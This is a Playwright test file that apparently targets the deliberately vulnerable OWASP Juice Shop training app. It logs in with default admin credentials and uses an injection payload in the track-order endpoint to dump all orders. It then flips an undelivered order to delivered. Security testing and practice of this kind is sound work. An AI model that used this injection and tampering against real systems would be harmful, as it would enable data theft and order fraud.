import { test, expect, request, APIRequestContext} from '@playwright/test';

let authReq: APIRequestContext;
let exfiltratedOrders: any[] = [];

test.beforeAll(async ({ baseURL }) => {
  const reqContext = await request.newContext();

  const loginRes = await reqContext.post(`${baseURL}/rest/user/login`, {
    data: { email: 'admin@juice-sh.op', password: 'admin123' },
  });

  const loginJson = await loginRes.json();
  const token = loginJson.authentication?.token;
  console.log('🔑 Token:', token);

  authReq = await request.newContext({
    baseURL,
    extraHTTPHeaders: {
      Authorization: `Bearer ${token}`,
    },
  });
});

test('📦 Exfiltrated Order Store › successfully exfiltrates all orders from hidden endpoint', async () => {
  const res = await authReq.get(`/rest/track-order/' || true || '`); // 🐍🧪

  console.log('🧪 Status:', res.status());
  const body = await res.text();
  console.log('🧪 Body:', body);

  expect(res.ok()).toBeTruthy();

  const json = JSON.parse(body);
  expect(Array.isArray(json.data)).toBe(true);

  exfiltratedOrders = json.data;
  console.log(`🧾 Exfiltrated orders (in-memory): `, exfiltratedOrders.length);
});


test('📦 Exfiltrated Order Store › store has orders and first order shape is valid', async () => {
  expect(exfiltratedOrders.length).toBeGreaterThan(0);
  const first = exfiltratedOrders[0];
  console.log('🧾 First exfiltrated order:', first);

  expect(first).toHaveProperty('orderId');
  expect(first).toHaveProperty('delivered');
  expect(first).toHaveProperty('products');

  const numericId = parseInt(first.orderId.split('-')[0], 10);
  expect(typeof numericId).toBe('number');
  expect(Number.isInteger(numericId)).toBe(true);
  expect(typeof first.delivered).toBe('boolean');
});

test('📦 Exfiltrated Order Store › flip the first not-delivered order', async () => {
  const targetOrder = exfiltratedOrders.find(order => order.delivered === false);

  expect(targetOrder).toBeTruthy(); // We should have one to flip
  const orderId = targetOrder.id;
  console.log(`🚚 Flipping order ID: ${orderId}`);

  const res = await authReq.put(`/rest/track-order/${orderId}/deliver`);
  console.log('🧪 Delivery flip response:', res.status());
const body = await res.text();
console.log('🧪 Raw response body:', body);

  expect(res.ok()).toBeTruthy(); // 🧨 This is where it failed before
  console.log(`✅ Flipped order ${orderId} to delivered = true`);
});

